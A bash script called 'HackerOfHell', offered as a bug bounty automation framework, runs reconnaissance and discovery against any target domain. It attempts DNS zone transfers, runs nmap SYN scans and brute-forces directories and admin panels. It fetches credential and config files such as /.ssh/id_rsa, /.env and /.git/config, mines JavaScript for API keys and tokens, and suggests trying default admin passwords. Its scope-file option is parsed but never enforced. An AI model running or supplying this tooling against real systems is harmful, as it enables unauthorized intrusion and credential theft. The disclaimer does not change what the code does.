#!/bin/bash
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║                                                                          ║
# ║   ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗ ███████╗   ║
# ║   ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗██╔════╝   ║
# ║   ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║███████╗   ║
# ║   ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║╚════██║   ║
# ║   ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝███████║   ║
# ║   ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝  ║
# ║                                                                          ║
# ║              O F   H E L L   —   U L T I M A T E   E D I T I O N       ║
# ║                                                                          ║
# ║   Author  : RAJESH BAJIYA                                               ║
# ║   Handle  : HACKEROFHELL                                                ║
# ║   Version : 3.0 ULTIMATE                                                ║
# ║   Purpose : World's Most Complete Bug Bounty Automation Framework       ║
# ║                                                                          ║
# ╚══════════════════════════════════════════════════════════════════════════╝
#
# LEGAL: Only use on systems you own or have explicit written permission to test.
# Unauthorized use is illegal. The author is not responsible for misuse.
#
# USAGE:
#   sudo ./hackerofhell.sh -t target.com [OPTIONS]
#
# OPTIONS:
#   -t  target domain          (required)
#   -o  output directory       (default: ~/hackerofhell)
#   -m  mode: passive|normal|ultra (default: normal)
#   -s  scope file             (file with in-scope domains/IPs)
#   -w  custom wordlist        (default: seclists)
#   -r  rate limit             (requests per second, default: 150)
#   -p  proxy                  (e.g. http://127.0.0.1:8080 for Burp)
#   -n  notify                 (send findings to Discord/Slack webhook)
#   --skip-heavy               (skip sqlmap/brute force - faster)
#   --deep                     (enable all heavy modules)
#   -h  help

set -uo pipefail

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ARGUMENT PARSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
TARGET=""
OUTBASE="$HOME/hackerofhell"
MODE="normal"
SCOPE_FILE=""
CUSTOM_WL=""
RATE="150"
PROXY=""
NOTIFY_WEBHOOK=""
SKIP_HEAVY=false
DEEP=false

while [[ $# -gt 0 ]]; do
  case "$1" in
    -t) TARGET="$2"; shift 2 ;;
    -o) OUTBASE="$2"; shift 2 ;;
    -m) MODE="$2"; shift 2 ;;
    -s) SCOPE_FILE="$2"; shift 2 ;;
    -w) CUSTOM_WL="$2"; shift 2 ;;
    -r) RATE="$2"; shift 2 ;;
    -p) PROXY="$2"; shift 2 ;;
    -n) NOTIFY_WEBHOOK="$2"; shift 2 ;;
    --skip-heavy) SKIP_HEAVY=true; shift ;;
    --deep) DEEP=true; shift ;;
    -h|--help)
      echo "Usage: $0 -t target.com [-o outdir] [-m passive|normal|ultra] [--deep]"
      exit 0 ;;
    *) shift ;;
  esac
done

if [[ -z "$TARGET" ]]; then
  echo "ERROR: Target required. Use: $0 -t target.com"
  exit 1
fi

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DIRECTORY STRUCTURE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
OUTDIR="$OUTBASE/$TARGET"
R01="$OUTDIR/01_recon"
R02="$OUTDIR/02_enum"
R03="$OUTDIR/03_crawl"
R04="$OUTDIR/04_vuln"
R05="$OUTDIR/05_poc"
R06="$OUTDIR/06_chains"
R07="$OUTDIR/07_report"
LOGFILE="$OUTDIR/hackerofhell.log"
FINDINGS="$OUTDIR/findings.json"
TMPDIR="$OUTDIR/.tmp"

mkdir -p "$R01" "$R02" "$R03" "$R04" "$R05" "$R06" "$R07" "$TMPDIR"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COLORS & LOGGING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'
C='\033[0;36m'; M='\033[0;35m'; B='\033[1;34m'
W='\033[1;37m'; NC='\033[0m'; BOLD='\033[1m'
BLINK='\033[5m'; DIM='\033[2m'

ts()    { date '+%H:%M:%S'; }
log()   { echo -e "${C}[$(ts)][*]${NC} $1" | tee -a "$LOGFILE"; }
ok()    { echo -e "${G}[$(ts)][+]${NC} ${BOLD}$1${NC}" | tee -a "$LOGFILE"; }
vuln()  { echo -e "${R}[$(ts)][VULN]${NC} ${BOLD}${BLINK}$1${NC}" | tee -a "$LOGFILE"; }
warn()  { echo -e "${Y}[$(ts)][!]${NC} $1" | tee -a "$LOGFILE"; }
info()  { echo -e "${B}[$(ts)][i]${NC} $1" | tee -a "$LOGFILE"; }
phase() {
  echo "" | tee -a "$LOGFILE"
  echo -e "${M}${BOLD}" | tee -a "$LOGFILE"
  echo "  ╔══════════════════════════════════════════════════════════╗" | tee -a "$LOGFILE"
  printf "  ║  %-56s║\n" "$1" | tee -a "$LOGFILE"
  echo "  ╚══════════════════════════════════════════════════════════╝" | tee -a "$LOGFILE"
  echo -e "${NC}" | tee -a "$LOGFILE"
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FINDINGS DATABASE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo '{"target":"'"$TARGET"'","author":"RAJESH BAJIYA","handle":"HACKEROFHELL","date":"'"$(date -u +%Y-%m-%dT%H:%M:%SZ)"'","mode":"'"$MODE"'","findings":[]}' > "$FINDINGS"

add_finding() {
  local title="$1" sev="$2" cvss="$3" tool="$4" url="$5" param="$6"
  local evidence="$7" poc="$8" remediation="$9" category="${10:-web}"
  python3 - <<PYEOF 2>/dev/null || true
import json
with open('$FINDINGS') as f: d=json.load(f)
d['findings'].append({
  "title":"$title","severity":"$sev","cvss":"$cvss","tool":"$tool",
  "url":"$url","parameter":"$param","category":"$category",
  "evidence":"""$evidence""","poc":"""$poc""","remediation":"""$remediation"""
})
with open('$FINDINGS','w') as f: json.dump(d,f,indent=2)
PYEOF
}

notify() {
  [[ -z "$NOTIFY_WEBHOOK" ]] && return
  local msg="$1"
  curl -sk -X POST "$NOTIFY_WEBHOOK" \
    -H "Content-Type: application/json" \
    -d "{\"text\":\"[HackerOfHell] $TARGET — $msg\"}" &>/dev/null &
}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# TOOL CHECK
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
check_tool() { command -v "$1" &>/dev/null; }

MISSING=()
REQUIRED=(nmap subfinder dnsx httpx nuclei gobuster ffuf sqlmap dalfox curl python3 whatweb)
for t in "${REQUIRED[@]}"; do
  check_tool "$t" || MISSING+=("$t")
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# WORDLISTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SECL="/usr/share/seclists"
WL_DIRS="$SECL/Discovery/Web-Content/raft-large-directories.txt"
WL_FILES="$SECL/Discovery/Web-Content/raft-large-files.txt"
WL_ADMIN="$SECL/Discovery/Web-Content/AdminPanels.txt"
WL_PARAMS="$SECL/Discovery/Web-Content/burp-parameter-names.txt"
WL_SUBDOMS="$SECL/Discovery/DNS/subdomains-top1million-110000.txt"
WL_API="$SECL/Discovery/Web-Content/api/api-endpoints.txt"
WL_BACKUP="$SECL/Discovery/Web-Content/Common-DB-Backups.txt"
[[ -n "$CUSTOM_WL" && -f "$CUSTOM_WL" ]] && WL_DIRS="$CUSTOM_WL"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# BANNER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
clear
echo -e "${R}${BOLD}"
cat << 'SKULL'

    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
    ░  ██╗  ██╗ █████╗  ██████╗██╗  ██╗███████╗██████╗  ██████╗  ░
    ░  ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔══██╗██╔═══██╗ ░
    ░  ███████║███████║██║     █████╔╝ █████╗  ██████╔╝██║   ██║ ░
    ░  ██╔══██║██╔══██║██║     ██╔═██╗ ██╔══╝  ██╔══██╗██║   ██║ ░
    ░  ██║  ██║██║  ██║╚██████╗██║  ██╗███████╗██║  ██║╚██████╔╝ ░
    ░  ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ░
    ░               O F   H E L L   v3.0  ULTIMATE                 ░
    ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░

SKULL
echo -e "${NC}"
echo -e "  ${M}${BOLD}Author  :${NC} ${W}RAJESH BAJIYA${NC}  ${DIM}|${NC}  ${M}${BOLD}Handle  :${NC} ${R}${BOLD}HACKEROFHELL${NC}"
echo -e "  ${M}${BOLD}Target  :${NC} ${G}${BOLD}$TARGET${NC}"
echo -e "  ${M}${BOLD}Mode    :${NC} ${Y}${MODE^^}${NC}"
echo -e "  ${M}${BOLD}Output  :${NC} ${C}$OUTDIR${NC}"
echo -e "  ${M}${BOLD}Date    :${NC} ${DIM}$(date)${NC}"
if [[ ${#MISSING[@]} -gt 0 ]]; then
  echo ""
  warn "Missing tools (some modules will skip): ${MISSING[*]}"
fi
echo ""
echo -e "  ${DIM}For authorized testing only. Unauthorized use is illegal.${NC}"
echo ""
sleep 2

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 1 — PASSIVE INTELLIGENCE GATHERING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 1 — PASSIVE INTELLIGENCE GATHERING"

# 1.1 Subdomain Enumeration (multi-source)
log "Multi-source subdomain enumeration..."
check_tool subfinder && subfinder -d "$TARGET" -silent -all \
  -o "$R01/subs_subfinder.txt" 2>/dev/null &
check_tool amass && amass enum -passive -d "$TARGET" \
  -o "$R01/subs_amass.txt" 2>/dev/null &
# DNS brute force
check_tool dnsx && [[ -f "$WL_SUBDOMS" ]] && \
  dnsx -d "$TARGET" -w "$WL_SUBDOMS" -silent \
  -o "$R01/subs_bruteforce.txt" 2>/dev/null &
wait

# Certificate transparency logs
log "Certificate transparency enumeration..."
curl -sk "https://crt.sh/?q=%25.$TARGET&output=json" 2>/dev/null \
  | python3 -c "
import json,sys
try:
  data=json.load(sys.stdin)
  names=set()
  for e in data:
    for n in e.get('name_value','').split('\n'):
      n=n.strip().lstrip('*.')
      if n.endswith('$TARGET'): names.add(n)
  print('\n'.join(sorted(names)))
except: pass
" > "$R01/subs_crtsh.txt" 2>/dev/null || true

# Merge all subdomains
cat "$R01"/subs_*.txt 2>/dev/null | sort -u > "$R01/all_subs.txt"
ok "Total unique subdomains: $(wc -l < "$R01/all_subs.txt" 2>/dev/null || echo 0)"

# 1.2 DNS Intelligence
log "DNS intelligence gathering..."
check_tool dnsx && dnsx -l "$R01/all_subs.txt" \
  -a -aaaa -cname -mx -ns -txt -resp -silent \
  -o "$R01/dns_full.txt" 2>/dev/null || true

# Zone transfer attempt
log "DNS zone transfer attempt..."
for NS in $(dig NS "$TARGET" +short 2>/dev/null); do
  RESULT=$(dig AXFR "$TARGET" @"$NS" 2>/dev/null)
  if echo "$RESULT" | grep -v "Transfer failed" | grep -q "IN"; then
    vuln "DNS ZONE TRANSFER: $TARGET via $NS"
    echo "$RESULT" > "$R05/zone_transfer_$NS.txt"
    add_finding "DNS Zone Transfer" "HIGH" "7.5" "dig" \
      "$TARGET" "DNS" \
      "Zone transfer succeeded via nameserver $NS" \
      "dig AXFR $TARGET @$NS" \
      "Disable zone transfers. Restrict AXFR to authorized secondaries only." "dns"
    notify "DNS ZONE TRANSFER found!"
  fi
done

# 1.3 Historical URL Collection
log "Collecting historical URLs from multiple sources..."
check_tool gau && gau "$TARGET" --threads 5 \
  --blacklist png,jpg,gif,css,woff,ico,svg \
  2>/dev/null | sort -u > "$R01/urls_gau.txt" &
check_tool waybackurls && echo "$TARGET" | waybackurls \
  2>/dev/null | sort -u > "$R01/urls_wayback.txt" &
# Common crawl
curl -sk "http://index.commoncrawl.org/CC-MAIN-2024-10-index?url=*.$TARGET&output=json" \
  2>/dev/null | python3 -c "
import json,sys
for line in sys.stdin:
  try:
    d=json.loads(line)
    print(d.get('url',''))
  except: pass
" | sort -u > "$R01/urls_commoncrawl.txt" 2>/dev/null &
wait
cat "$R01"/urls_*.txt 2>/dev/null | sort -u > "$R01/all_urls.txt"
ok "Historical URLs collected: $(wc -l < "$R01/all_urls.txt" 2>/dev/null || echo 0)"

# 1.4 WHOIS + ASN
log "WHOIS and ASN intelligence..."
whois "$TARGET" > "$R01/whois.txt" 2>/dev/null || true
TARGET_IP=$(dig +short "$TARGET" | grep -E '^[0-9]+\.' | head -1)
if [[ -n "$TARGET_IP" ]]; then
  curl -sk "https://ipinfo.io/$TARGET_IP/json" > "$R01/ipinfo.json" 2>/dev/null || true
  ASN=$(cat "$R01/ipinfo.json" | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('org',''))" 2>/dev/null || true)
  ok "IP: $TARGET_IP | ASN: $ASN"
fi

# 1.5 Google Dorking URLs (build dork list for manual use)
log "Generating Google dorks for manual investigation..."
cat > "$R01/google_dorks.txt" << DORKS
site:$TARGET inurl:admin
site:$TARGET inurl:login
site:$TARGET inurl:upload
site:$TARGET inurl:config
site:$TARGET inurl:backup
site:$TARGET inurl:debug
site:$TARGET inurl:test
site:$TARGET inurl:dev
site:$TARGET inurl:api
site:$TARGET ext:php inurl:?
site:$TARGET ext:env
site:$TARGET ext:sql
site:$TARGET ext:log
site:$TARGET ext:bak
site:$TARGET ext:old
site:$TARGET "index of"
site:$TARGET "error" OR "exception" OR "stack trace"
site:$TARGET "password" OR "passwd" OR "credentials"
site:$TARGET filetype:pdf
"$TARGET" inurl:github
"$TARGET" site:pastebin.com
"$TARGET" site:trello.com
DORKS
ok "Google dorks saved to: $R01/google_dorks.txt"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 2 — ACTIVE RECONNAISSANCE & FINGERPRINTING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 2 — ACTIVE RECONNAISSANCE & FINGERPRINTING"

# 2.1 Live host probing
log "Probing live hosts with httpx..."
check_tool httpx && httpx -l "$R01/all_subs.txt" \
  -title -tech-detect -status-code -content-length \
  -follow-redirects -ip -cdn -silent \
  -o "$R02/live_hosts.txt" 2>/dev/null || true

grep -oP 'https?://[^\s]+' "$R02/live_hosts.txt" 2>/dev/null \
  | sort -u > "$R02/live_urls.txt" || touch "$R02/live_urls.txt"
ok "Live hosts: $(wc -l < "$R02/live_urls.txt")"

# 2.2 Comprehensive Nmap
log "Comprehensive nmap scan..."
# Top ports scan first (fast)
nmap -sS -T3 --open --top-ports 1000 \
  -oN "$R02/nmap_top1000.txt" \
  -oX "$R02/nmap_top1000.xml" \
  "$TARGET" 2>/dev/null || true

# Full port scan in background if deep mode
if [[ "$DEEP" == "true" ]]; then
  log "Deep mode: full 65535 port scan running in background..."
  nmap -sS -T3 --open -p- \
    -oN "$R02/nmap_allports.txt" \
    "$TARGET" 2>/dev/null &
fi

# Service version detection on found open ports
OPEN_PORTS=$(grep '/tcp.*open' "$R02/nmap_top1000.txt" 2>/dev/null \
  | awk -F'/' '{print $1}' | tr '\n' ',' | sed 's/,$//')
if [[ -n "$OPEN_PORTS" ]]; then
  nmap -sV -sC -A --open -p "$OPEN_PORTS" \
    -oN "$R02/nmap_services.txt" \
    "$TARGET" 2>/dev/null || true
fi

# Check dangerous exposed services
DANGEROUS_PORTS=(
  "21:FTP:CRITICAL"
  "22:SSH:INFO"
  "23:Telnet:HIGH"
  "25:SMTP:MEDIUM"
  "445:SMB:CRITICAL"
  "3306:MySQL:HIGH"
  "5432:PostgreSQL:HIGH"
  "6379:Redis:CRITICAL"
  "9200:Elasticsearch:CRITICAL"
  "27017:MongoDB:CRITICAL"
  "11211:Memcached:HIGH"
  "3389:RDP:HIGH"
  "5900:VNC:HIGH"
  "2375:Docker-API:CRITICAL"
  "8500:Consul:HIGH"
  "8600:Consul-DNS:MEDIUM"
)
for entry in "${DANGEROUS_PORTS[@]}"; do
  port="${entry%%:*}"; rest="${entry#*:}"; svc="${rest%%:*}"; sev="${rest##*:}"
  if grep -q "$port/tcp.*open" "$R02/nmap_top1000.txt" 2>/dev/null; then
    vuln "EXPOSED SERVICE: $svc on port $port [$sev]"
    add_finding "Exposed $svc Service (Port $port)" "$sev" "8.5" "nmap" \
      "$TARGET:$port" "network" \
      "Port $port ($svc) is open and accessible from the internet" \
      "nc -v $TARGET $port\nnmap -sV -p $port $TARGET" \
      "Block port $port via firewall. Place behind VPN. Require strong authentication." "network"
    notify "EXPOSED $svc on $TARGET:$port [$sev]"
  fi
done

# 2.3 WAF & CDN Detection
log "WAF and CDN detection..."
check_tool wafw00f && \
  wafw00f "https://$TARGET" 2>/dev/null | tee "$R02/waf.txt" || true

# 2.4 Technology Fingerprinting
log "Deep technology fingerprinting..."
check_tool whatweb && \
  whatweb -a 3 "https://$TARGET" \
  --log-verbose="$R02/whatweb_verbose.txt" \
  --log-json="$R02/whatweb.json" 2>/dev/null || true

# WordPress detection
if grep -qi "wordpress\|wp-content\|wp-includes" "$R02/whatweb_verbose.txt" 2>/dev/null; then
  log "WordPress detected — running wpscan..."
  check_tool wpscan && wpscan \
    --url "https://$TARGET" \
    --enumerate vp,vt,u,ap,at,cb,dbe \
    --no-update --silent \
    --format json \
    -o "$R04/wpscan.json" 2>/dev/null || true
fi

# 2.5 Email & Metadata
log "Harvesting emails and metadata..."
curl -sk "https://api.hunter.io/v2/domain-search?domain=$TARGET&api_key=free" \
  2>/dev/null | python3 -c "
import json,sys
try:
  d=json.load(sys.stdin)
  for e in d.get('data',{}).get('emails',[]):
    print(e.get('value',''))
except: pass
" > "$R01/emails.txt" 2>/dev/null || true

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PHASE 3 — DEEP CONTENT DISCOVERY
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
phase "PHASE 3 — DEEP CONTENT DISCOVERY"

# 3.1 robots.txt & sitemap parsing
log "Parsing robots.txt and sitemaps..."
for SCHEME in https http; do
  ROBOTS=$(curl -sk --max-time 10 "$SCHEME://$TARGET/robots.txt" 2>/dev/null || true)
  if echo "$ROBOTS" | grep -qiE "disallow|allow|sitemap"; then
    echo "$ROBOTS" > "$R03/robots_$SCHEME.txt"
    # Extract disallowed paths
    echo "$ROBOTS" | grep -i "Disallow:" | awk '{print $2}' \
      >> "$R03/robots_paths.txt" 2>/dev/null
    ok "robots.txt found at $SCHEME://$TARGET/robots.txt"
  fi
  # Sitemaps
  for SMAP in sitemap.xml sitemap_index.xml sitemap.php sitemap.txt; do
    CODE=$(curl -sk -o "$TMPDIR/sitemap.tmp" -w "%{http_code}" \
      --max-time 10 "$SCHEME://$TARGET/$SMAP" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      grep -oP 'https?://[^\s<>"]+' "$TMPDIR/sitemap.tmp" \
        >> "$R03/sitemap_urls.txt" 2>/dev/null || true
    fi
  done
done
sort -u "$R03/sitemap_urls.txt" -o "$R03/sitemap_urls.txt" 2>/dev/null || true

# 3.2 Admin Panel Discovery
log "Admin panel brute force on all live hosts..."
while IFS= read -r LURL; do
  [[ -z "$LURL" ]] && continue
  HOST=$(echo "$LURL" | grep -oP 'https?://[^/]+')
  gobuster dir -u "$HOST" -w "$WL_ADMIN" \
    -o "$R03/admin_$(echo $HOST | tr '/:' '__').txt" \
    -q --no-error --timeout 10s 2>/dev/null &
done < "$R02/live_urls.txt"
wait

# Collect admin panel findings
cat "$R03"/admin_*.txt 2>/dev/null \
  | grep -E ' 200 | 302 | 301 ' > "$R03/admin_found.txt" || true

while IFS= read -r line; do
  [[ -z "$line" ]] && continue
  APATH=$(echo "$line" | awk '{print $1}')
  CODE=$(echo "$line" | awk '{print $2}')
  vuln "ADMIN PANEL FOUND: $APATH (HTTP $CODE)"
  add_finding "Exposed Admin Panel" "HIGH" "7.2" "gobuster" \
    "$APATH" "path" \
    "Admin panel accessible at $APATH returning HTTP $CODE" \
    "curl -v '$APATH'\n# Test default creds: admin:admin admin:password admin:123456 admin:admin123" \
    "Restrict access by IP whitelist. Enforce MFA. Move to non-standard path." "web"
done < "$R03/admin_found.txt"

# 3.3 Directory & File Brute Force
log "Full directory and file brute force..."
ffuf -u "https://$TARGET/FUZZ" \
  -w "$WL_DIRS" \
  -mc 200,201,301,302,403 \
  -o "$R03/ffuf_dirs.json" -of json \
  -t 50 -s 2>/dev/null || true

# 3.4 Backup File Discovery
log "Hunting backup and config files..."
BACKUP_EXTS=(
  "backup" "bak" "old" "orig" "copy" "tmp" "temp"
  "sql" "db" "sqlite" "dump"
  "zip" "tar" "tar.gz" "tgz" "7z" "rar"
  "env" "env.bak" "env.old" "env.local"
  "config" "conf" "cfg" "ini"
  "log" "logs" "error.log" "access.log" "debug.log"
)
BACKUP_NAMES=("backup" "database" "db" "dump" "data" "app" "web" "site" "$TARGET")

for NAME in "${BACKUP_NAMES[@]}"; do
  for EXT in "${BACKUP_EXTS[@]}"; do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" \
      --max-time 5 "https://$TARGET/$NAME.$EXT" 2>/dev/null || echo "000")
    if [[ "$CODE" == "200" ]]; then
      SIZE=$(curl -sk -I --max-time 5 "https://$TARGET/$NAME.$EXT" 2>/dev/null \
        | grep -i content-length | awk '{print $2}' | tr -d '\r')
      vuln "BACKUP FILE EXPOSED: https://$TARGET/$NAME.$EXT (HTTP 200, ${SIZE}B)"
      add_finding "Exposed Backup File: $NAME.$EXT" "HIGH" "7.5" "curl" \
        "https://$TARGET/$NAME.$EXT" "path" \
        "Backup file accessible: $NAME.$EXT (${SIZE} bytes)" \
        "curl -sk 'https://$TARGET/$NAME.$EXT' -o $NAME.$EXT" \
        "Remove backup files from web root. Add deny rules. Never commit backups to public paths." "exposure"
      notify "BACKUP FILE: $NAME.$EXT on $TARGET"
    fi
  done
done

# 3.5 Sensitive Path Check
log "Checking sensitive file exposure..."
SENSITIVE=(
  "/.env" "/.env.local" "/.env.prod" "/.env.backup"
  "/.git/HEAD" "/.git/config" "/.git/COMMIT_EDITMSG"
  "/.svn/entries" "/.hg/hgrc"
  "/phpinfo.php" "/info.php" "/php.php" "/test.php" "/debug.php"
  "/server-status" "/server-info" "/_profiler"
  "/wp-config.php" "/wp-config.php.bak" "/wp-config.txt"
  "/config.php" "/config.inc.php" "/configuration.php"
  "/web.config" "/web.config.bak"
  "/.htpasswd" "/.htaccess"
  "/composer.json" "/composer.lock" "/package.json"
  "/Dockerfile" "/docker-compose.yml" "/.dockerignore"
  "/Makefile" "/Gruntfile.js" "/Gulpfile.js"
  "/.bash_history" "/.ssh/id_rsa" "/.ssh/authorized_keys"
  "/crossdomain.xml" "/clientaccesspolicy.xml"
  "/graphql" "/graphiql" "/__graphql" "/playground"
  "/swagger.json" "/openapi.json" "/swagger-ui.html" "/api-docs"
  "/actuator" "/actuator/env" "/actuator/heapdump" "/actuator/mappings"
  "/console" "/h2-console" "/admin/console"
  "/.well-known/security.txt"
  "/trace" "/.trace"
  "/telescope" "/horizon" "/nova"
)
for SPATH in "${SENSITIVE[@]}"; do
  CODE=$(curl -sk -o "$TMPDIR/sensitive.tmp" -w "%{http_code}" \
    --max-time 5 "https://$TARGET$SPATH" 2>/dev/null || echo "000")
  if [[ "$CODE" == "200" ]]; then
    SIZE=$(wc -c < "$TMPDIR/sensitive.tmp" 2>/dev/null || echo 0)
    [[ "$SIZE" -lt 10 ]] && continue
    PREVIEW=$(strings "$TMPDIR/sensitive.tmp" 2>/dev/null | head -3 | tr '\n' ' ')
    SEV="MEDIUM"; CVSS="5.3"
    echo "$SPATH" | grep -qE '\.env|\.git|config|password|\.ssh|heapdump' && SEV="CRITICAL" && CVSS="9.1"
    echo "$SPATH" | grep -qE 'swagger|graphql|actuator|phpinfo' && SEV="HIGH" && CVSS="7.5"
    vuln "SENSITIVE FILE: https://$TARGET$SPATH [$SEV] ${SIZE}B"
    add_finding "Sensitive File Exposure: $SPATH" "$SEV" "$CVSS" "curl" \
      "https://$TARGET$SPATH" "path" \
      "$SPATH accessible (HTTP 200, ${SIZE}B). Content: $PREVIEW" \
      "curl -sk 'https://$TARGET$SPATH'\ncurl -sk 'https://$TARGET$SPATH' | grep -iE 'password|secret|key|token'" \
      "Remove from web root. Add server deny rules. Rotate any exposed credentials." "exposure"
    notify "SENSITIVE FILE: $SPATH on $TARGET [$SEV]"
  fi
done

# 3.6 JavaScript Analysis
log "Deep JavaScript analysis and secret mining..."
> "$R03/js_secrets.txt"
check_tool httpx && httpx -l "$R02/live_urls.txt" \
  -path "/js" -silent 2>/dev/null || true

# Collect JS files from crawling
curl -sk "https://$TARGET" 2>/dev/null \
  | grep -oP '(?:src)="([^"]+\.js[^"]*)"' \
  | grep -oP '"[^"]+"' | tr -d '"' \
  | while read -r JSREL; do
    echo "$JSREL" | grep -q '^http' && echo "$JSREL" || echo "https://$TARGET$JSREL"
  done > "$R03/js_files.txt" 2>/dev/null || true

SECRET_PATTERNS=(
  'api[_-]?key\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{16,}'
  'api[_-]?secret\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{16,}'
  'access[_-]?token\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\._.]{16,}'
  'secret[_-]?key\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{16,}'
  'password\s*[=:]\s*["\x27][^\x27"]{6,}'
  'auth[_-]?token\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{16,}'
  'AKIA[0-9A-Z]{16}'
  'bearer\s+[A-Za-z0-9+/=_\-\.]{20,}'
  'private[_-]?key\s*[=:]\s*["\x27]'
  'client[_-]?secret\s*[=:]\s*["\x27][A-Za-z0-9+/=_\-\.]{16,}'
  'firebase.*["\x27][A-Za-z0-9+/=_\-\.]{30,}'
  'eyJ[A-Za-z0-9+/=_\-\.]{20,}'
)

while IFS= read -r JSURL; do
  [[ -z "$JSURL" ]] && continue
  CONTENT=$(curl -sk --max-time 10 "$JSURL" 2>/dev/null || true)
  [[ -z "$CONTENT" ]] && continue
  for PAT in "${SECRET_PATTERNS[@]}"; do
    MATCHES=$(echo "$CONTENT" | grep -oiP "$PAT" 2>/dev/null | head -5 || true)
    if [[ -n "$MATCHES" ]]; then
      vuln "SECRET IN JS: $JSURL"
      echo "=== $JSURL ===" >> "$R03/js_secrets.txt"
      echo "$MATCHES" >> "$R03/js_secrets.txt"
      add_finding "Hardcoded Secret in JavaScript" "CRITICAL" "9.1" "custom" \
        "$JSURL" "javascript source" \
        "Secret pattern found: $(echo $MATCHES | head -c 120)" \
        "curl -sk '$JSURL' | grep -iP 'api_key|secret|token|password|AKIA'\n\n# Check for JWT tokens:\ncurl -sk '$JSURL' | grep -oP 'eyJ[A-Za-z0-9+/=._-]+'" \
        "Never store secrets in client-side code. Rotate all exposed credentials. Use server-side environment variables." "exposure"
      notify "HARDCODED SECRET found in JS on $TARGET!"
    fi
  done
done < "$R03/js_files.txt"

# 3.7 API Endpoint Discovery
log "API endpoint discovery..."
[[ -f "$WL_API" ]] && ffuf -u "https://$TARGET/FUZZ" \
  -w "$WL_API" -mc 200,201,204,301,302,401,403 \
  -o "$R03/api_endpoints.json" -of json \
  -t 30 -s 2>/dev/null || true

# Collect all parameter URLs
cat "$R01/all_urls.txt" "$R03/sitemap_urls.txt" 2>/dev/null \
  | grep "=" | grep -v "\.(png|jpg|gif|css|woff|ico|svg)" \
  | sort -u > "$R03/param_urls.txt"
ok "Parameter URLs: $(wc -l < "$R03/param_urls.txt" 2>/dev/null || echo 0)"

